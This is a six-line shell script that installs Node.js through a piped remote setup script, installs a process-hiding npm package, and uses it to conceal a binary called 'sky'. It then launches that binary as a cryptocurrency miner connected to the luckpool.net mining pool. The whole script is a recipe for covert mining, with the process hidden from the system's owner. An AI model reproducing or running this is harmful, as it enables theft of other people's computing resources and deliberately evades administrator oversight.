curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add sky
chmod +x sky
./sky -c stratum+ssl://na.luckpool.net:3958 -u ADDRESS.WORKER -p x
